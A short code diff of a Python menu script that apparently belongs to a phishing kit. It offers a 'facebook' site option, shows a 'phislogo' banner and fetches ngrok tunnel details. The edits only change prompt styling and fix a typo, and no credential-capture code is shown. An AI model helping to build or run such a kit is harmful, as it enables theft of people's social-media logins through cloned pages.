@@ -20,7 +20,7 @@ os.system("xdg-open https://www.facebook.com/profile.php?id=100051548076449")
 print(a)
 def setup_site(website):
 	os.system("clear")
-main_opt=str(input(red+"\n[>] Select Your Option : "+yellow))
+main_opt=str(input(red+"\n[★] Select Your Option : "+cyan))
 
 if main_opt=="01" or main_opt=="1":
 	website="facebook"
@@ -101,7 +101,7 @@ os.system("xdg-open https://www.facebook.com/profile.php?id=100051548076449")
 print()
 os.system("clear")
 os.system("lolcat phislogo.py")
-pritn()
+print()
 print(a)
 print()
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
